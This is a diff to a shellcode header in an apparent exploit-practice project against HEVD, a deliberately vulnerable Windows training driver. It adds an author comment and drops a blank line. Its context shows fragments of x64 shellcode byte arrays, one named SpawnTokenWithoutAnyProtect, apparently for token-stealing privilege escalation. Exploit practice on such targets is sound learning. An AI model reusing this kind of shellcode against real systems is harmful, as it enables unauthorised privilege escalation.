@@ -1,3 +1,9 @@
+/*
+ * @Date: 2026-04-16 09:14:18
+ * @LastEditors: joe1sn joe1sn23333@gmail.com
+ * @LastEditTime: 2026-10-22 11:13:41
+ * @FilePath: \WinX_HEVD_EXP\include\common\shellcode.hpp
+ */
 #pragma once
 
 namespace exploit
@@ -33,7 +39,6 @@ namespace exploit
             0x83, 0xE1, 0xF0, 0x48, 0x89, 0x59, 0x40, 0x48, 0x89, 0x59, 0x48, 0x48,
             0x83, 0xC4, 0x10, 0xC3
         };
-
 
 
         constexpr unsigned char SpawnTokenWithoutAnyProtect[] = {
